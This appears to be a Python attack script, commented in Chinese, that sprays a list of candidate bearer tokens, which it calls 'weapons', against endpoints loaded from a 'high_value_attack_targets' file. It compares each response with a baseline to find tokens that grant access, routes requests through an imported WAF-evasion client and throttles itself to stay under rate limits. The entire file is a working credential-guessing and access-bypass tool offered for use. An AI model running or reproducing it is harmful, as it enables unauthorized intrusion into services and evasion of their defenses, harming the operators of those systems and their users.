
import asyncio
import aiohttp
import json
import hashlib
import time
from datetime import datetime
from typing import List, Dict, Any, Tuple
from anti_waf_engine import StealthHTTPClient
from valuable_entropy_weapons import ALL_VALUABLE_STRINGS

class ResponseComparator:
    """响应比对引擎 - 检测微妙差异的核心"""
    
    def __init__(self):
        self.baselines = {}  # 存储基线响应
        self.anomalies = []  # 存储异常响应
    
    def calculate_response_signature(self, response_data: dict) -> str:
        """计算响应签名用于比对"""
        signature_data = {
            'status': response_data['status_code'],
            'length': response_data['content_length'],
            'headers_hash': hashlib.md5(str(sorted(response_data.get('headers', {}).items())).encode()).hexdigest()[:8],
            'content_hash': hashlib.md5(response_data.get('content', b'')[:1000]).hexdigest()[:12]  # 只取前1000字节避免大文件
        }
        return f"{signature_data['status']}_{signature_data['length']}_{signature_data['headers_hash']}_{signature_data['content_hash']}"
    
    def register_baseline(self, endpoint: str, token_hash: str, response_data: dict):
        """注册基线响应"""
        key = f"{endpoint}_{token_hash}"
        signature = self.calculate_response_signature(response_data)
        self.baselines[key] = {
            'signature': signature,
            'response': response_data,
            'timestamp': time.time()
        }
    
    def compare_response(self, endpoint: str, token_hash: str, response_data: dict) -> Dict[str, Any]:
        """比对响应，检测异常"""
        current_signature = self.calculate_response_signature(response_data)
        baseline_key = f"{endpoint}_{token_hash}"
        
        # 检查是否有基线
        if baseline_key not in self.baselines:
            return {'type': 'NO_BASELINE', 'severity': 'INFO'}
        
        baseline_signature = self.baselines[baseline_key]['signature']
        
        if current_signature == baseline_signature:
            return {'type': 'IDENTICAL', 'severity': 'NORMAL'}
        
        # 检测差异类型
        baseline_resp = self.baselines[baseline_key]['response']
        
        # 状态码变化
        if response_data['status_code'] != baseline_resp['status_code']:
            return {
                'type': 'STATUS_CHANGE',
                'severity': 'HIGH',
                'details': f"{baseline_resp['status_code']} -> {response_data['status_code']}"
            }
        
        # 内容长度显著变化 (>20%差异)
        baseline_len = baseline_resp['content_length']
        current_len = response_data['content_length']
        if baseline_len > 0:
            length_diff = abs(current_len - baseline_len) / baseline_len
            if length_diff > 0.2:
                return {
                    'type': 'CONTENT_LENGTH_CHANGE',
                    'severity': 'MEDIUM',
                    'details': f"{baseline_len} -> {current_len} ({length_diff:.1%} change)"
                }
        
        # 内容哈希变化
        return {
            'type': 'CONTENT_CHANGE',
            'severity': 'LOW',
            'details': 'Response content differs'
        }

class DetailedLogger:
    """详尽日志记录器"""
    
    def __init__(self, session_id: str):
        self.session_id = session_id
        self.log_file = f"recon_strike_log_{session_id}.jsonl"
        self.summary_file = f"recon_strike_summary_{session_id}.json"
        self.request_count = 0
        self.start_time = time.time()
        
    def log_request(self, request_data: dict, response_data: dict, comparison_result: dict):
        """记录单次请求的完整信息"""
        self.request_count += 1
        
        # 处理response_data中的bytes内容，使其可JSON序列化
        log_response_data = response_data.copy()
        if 'content' in log_response_data and isinstance(log_response_data['content'], bytes):
            # 尝试解码为文本，如果失败则转为base64
            try:
                log_response_data['content'] = log_response_data['content'].decode('utf-8', errors='ignore')[:500] + "..." if len(log_response_data['content']) > 500 else log_response_data['content'].decode('utf-8', errors='ignore')
            except:
                import base64
                log_response_data['content'] = base64.b64encode(log_response_data['content'][:200]).decode('ascii') + "..."
        
        log_entry = {
            'request_id': self.request_count,
            'timestamp': datetime.now().isoformat(),
            'session_id': self.session_id,
            'request': request_data,
            'response': log_response_data,
            'comparison': comparison_result,
            'elapsed_since_start': time.time() - self.start_time
        }
        
        # 写入JSONL格式日志
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')
    
    def generate_summary(self, anomalies: List[dict], rate_limit_info: dict):
        """生成会话总结报告"""
        summary = {
            'session_id': self.session_id,
            'start_time': datetime.fromtimestamp(self.start_time).isoformat(),
            'end_time': datetime.now().isoformat(),
            'total_requests': self.request_count,
            'duration_seconds': time.time() - self.start_time,
            'anomalies_found': len(anomalies),
            'rate_limit_info': rate_limit_info,
            'anomalies': anomalies
        }
        
        with open(self.summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)
        
        return summary

class RateLimitMonitor:
    """速率限制监控器"""
    
    def __init__(self):
        self.response_times = []
        self.status_codes = []
        self.banned_indicators = ['429', '503', '502', 'rate limit', 'too many requests']
        self.last_check_time = time.time()
    
    def record_response(self, status_code: int, response_time: float, content: str = ""):
        """记录响应用于分析"""
        self.response_times.append(response_time)
        self.status_codes.append(status_code)
        
        # 只保留最近50次记录
        if len(self.response_times) > 50:
            self.response_times = self.response_times[-50:]
            self.status_codes = self.status_codes[-50:]
    
    def assess_rate_limit_risk(self) -> Dict[str, Any]:
        """评估速率限制风险"""
        if len(self.response_times) < 5:
            return {'risk_level': 'UNKNOWN', 'recommendation': 'CONTINUE'}
        
        recent_times = self.response_times[-10:]
        recent_codes = self.status_codes[-10:]
        
        # 检查429错误
        rate_limit_count = sum(1 for code in recent_codes if code in [429, 503, 502])
        if rate_limit_count >= 3:
            return {
                'risk_level': 'HIGH',
                'recommendation': 'INCREASE_DELAY',
                'details': f'{rate_limit_count} rate limit responses in last 10 requests'
            }
        
        # 检查响应时间急剧增加
        avg_time = sum(recent_times) / len(recent_times)
        if avg_time > 10.0:  # 响应时间超过10秒
            return {
                'risk_level': 'MEDIUM',
                'recommendation': 'REDUCE_CONCURRENCY',
                'details': f'Average response time: {avg_time:.2f}s'
            }
        
        return {'risk_level': 'LOW', 'recommendation': 'CONTINUE'}

class ReconnaissanceStrikeController:
    """侦察打击控制器主类"""
    
    def __init__(self):
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.weapons = ALL_VALUABLE_STRINGS
        self.logger = DetailedLogger(self.session_id)
        self.comparator = ResponseComparator()
        self.rate_monitor = RateLimitMonitor()
        
        # 可调参数
        self.batch_size = 5  # 先遣队大小
        self.request_delay = 2.0  # 请求间延迟(秒)
        self.concurrency = 2  # 并发数
        
    def _hash_token(self, token: str) -> str:
        """生成令牌哈希用于日志"""
        return hashlib.sha256(token.encode()).hexdigest()[:8]
    
    async def _execute_single_request(self, client: StealthHTTPClient, weapon: str, endpoint: str) -> Dict[str, Any]:
        """执行单次请求"""
        weapon_hash = self._hash_token(weapon)
        request_start = time.time()
        
        request_data = {
            'weapon_hash': weapon_hash,
            'endpoint': endpoint,
            'timestamp': datetime.now().isoformat(),
            'request_method': 'GET'
        }
        
        try:
            headers = {'Authorization': f'Bearer {weapon}'}
            
            async with await client.get(endpoint, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as response:
                content = await response.read()
                response_time = time.time() - request_start
                
                response_data = {
                    'status_code': response.status,
                    'content_length': len(content),
                    'response_time': response_time,
                    'headers': dict(response.headers),
                    'content': content,
                    'success': True
                }
                
                # 记录到速率监控
                self.rate_monitor.record_response(response.status, response_time, content.decode('utf-8', errors='ignore'))
                
                return request_data, response_data
                
        except Exception as e:
            response_data = {
                'status_code': 0,
                'content_length': 0,
                'response_time': time.time() - request_start,
                'headers': {},
                'content': b'',
                'success': False,
                'error': str(e)
            }
            
            return request_data, response_data
    
    async def scout_mission(self, target_endpoints: List[str]) -> Dict[str, Any]:
        """先遣队任务 - 小规模测试"""
        print(f"🔍 启动先遣队任务 - 会话ID: {self.session_id}")
        print(f"🎯 目标端点: {len(target_endpoints)}个")
        print(f"🔑 武器数量: {len(self.weapons)}个")
        print(f"⚡ 并发数: {self.concurrency}, 延迟: {self.request_delay}s")
        
        anomalies = []
        
        async with StealthHTTPClient() as client:
            # 第一阶段：建立基线 (用第一个武器)
            print("\n📊 第一阶段：建立基线响应...")
            baseline_weapon = self.weapons[0]
            
            for endpoint in target_endpoints:
                print(f"📍 建立基线: {endpoint}")
                
                request_data, response_data = await self._execute_single_request(client, baseline_weapon, endpoint)
                
                # 注册基线
                self.comparator.register_baseline(endpoint, self._hash_token(baseline_weapon), response_data)
                
                # 记录日志
                comparison_result = {'type': 'BASELINE', 'severity': 'INFO'}
                self.logger.log_request(request_data, response_data, comparison_result)
                
                # 检查速率限制
                rate_assessment = self.rate_monitor.assess_rate_limit_risk()
                if rate_assessment['risk_level'] == 'HIGH':
                    print(f"⚠️ 速率限制风险: {rate_assessment['details']}")
                    self.request_delay *= 2  # 动态调整延迟
                    print(f"🔧 调整延迟至: {self.request_delay}s")
                
                await asyncio.sleep(self.request_delay)
            
            # 第二阶段：差异检测 (用其他武器)
            print(f"\n🔬 第二阶段：差异检测 (使用其余{len(self.weapons)-1}个武器)...")
            
            for weapon_idx, weapon in enumerate(self.weapons[1:], 2):
                print(f"\n🔑 测试武器 {weapon_idx}/{len(self.weapons)}: {self._hash_token(weapon)}")
                
                for endpoint in target_endpoints:
                    print(f"  📍 测试端点: {endpoint}")
                    
                    request_data, response_data = await self._execute_single_request(client, weapon, endpoint)
                    
                    # 响应比对
                    comparison_result = self.comparator.compare_response(endpoint, self._hash_token(baseline_weapon), response_data)
                    
                    # 记录日志
                    self.logger.log_request(request_data, response_data, comparison_result)
                    
                    # 检查异常
                    if comparison_result['severity'] in ['HIGH', 'MEDIUM']:
                        anomaly = {
                            'weapon_hash': self._hash_token(weapon),
                            'endpoint': endpoint,
                            'comparison': comparison_result,
                            'response_summary': {
                                'status': response_data['status_code'],
                                'length': response_data['content_length'],
                                'time': response_data['response_time']
                            }
                        }
                        anomalies.append(anomaly)
                        print(f"    🚨 发现异常: {comparison_result['type']} - {comparison_result.get('details', '')}")
                    else:
                        print(f"    ✅ 正常响应: {comparison_result['type']}")
                    
                    # 速率控制
                    rate_assessment = self.rate_monitor.assess_rate_limit_risk()
                    if rate_assessment['recommendation'] == 'INCREASE_DELAY':
                        self.request_delay = min(self.request_delay * 1.5, 10.0)
                        print(f"    🔧 增加延迟至: {self.request_delay}s")
                    
                    await asyncio.sleep(self.request_delay)
        
        # 生成总结报告
        final_rate_assessment = self.rate_monitor.assess_rate_limit_risk()
        summary = self.logger.generate_summary(anomalies, final_rate_assessment)
        
        return summary
    
    def select_scout_targets(self, all_endpoints: List[str], count: int = 8) -> List[str]:
        """智能选择先遣队目标"""
        # 优先选择可能权限要求较低的端点
        priority_patterns = [
            '/health', '/status', '/version', '/info', '/config',
            '/api/health', '/api/status', '/api/version', '/api/info'
        ]
        
        selected = []
        
        # 先选择高优先级端点
        for pattern in priority_patterns:
            matching = [ep for ep in all_endpoints if pattern in ep.lower()]
            if matching and len(selected) < count:
                selected.extend(matching[:min(2, count - len(selected))])
        
        # 补充随机端点
        if len(selected) < count:
            remaining = [ep for ep in all_endpoints if ep not in selected]
            import random
            selected.extend(random.sample(remaining, min(count - len(selected), len(remaining))))
        
        return selected[:count]

async def main():
    """主执行函数"""
    print("🚀 侦察打击控制器启动")
    print("📋 加载高价值目标端点...")
    
    # 加载目标端点
    try:
        with open('high_value_attack_targets.txt', 'r') as f:
            all_endpoints = [line.strip() for line in f if line.strip() and line.strip().startswith('http')]
    except FileNotFoundError:
        print("❌ 未找到high_value_attack_targets.txt文件")
        return
    
    print(f"📊 总端点数: {len(all_endpoints)}")
    
    # 创建控制器
    controller = ReconnaissanceStrikeController()
    
    # 选择先遣队目标
    scout_targets = controller.select_scout_targets(all_endpoints, count=8)
    
    print(f"\n🎯 先遣队目标选择完成:")
    for i, target in enumerate(scout_targets, 1):
        print(f"  {i}. {target}")
    
    # 执行先遣队任务
    summary = await controller.scout_mission(scout_targets)
    
    # 显示结果
    print(f"\n📊 先遣队任务完成总结:")
    print(f"  🔬 总请求数: {summary['total_requests']}")
    print(f"  ⏱️ 任务时长: {summary['duration_seconds']:.1f}秒")
    print(f"  🚨 发现异常: {summary['anomalies_found']}个")
    print(f"  🛡️ 速率限制风险: {summary['rate_limit_info']['risk_level']}")
    
    if summary['anomalies_found'] > 0:
        print(f"\n🎯 重要发现:")
        for anomaly in summary['anomalies'][:3]:  # 显示前3个异常
            print(f"  • 端点: {anomaly['endpoint']}")
            print(f"    异常类型: {anomaly['comparison']['type']}")
            print(f"    详情: {anomaly['comparison'].get('details', 'N/A')}")
    
    print(f"\n📁 详细日志: {controller.logger.log_file}")
    print(f"📄 总结报告: {controller.logger.summary_file}")

if __name__ == "__main__":
    asyncio.run(main()) 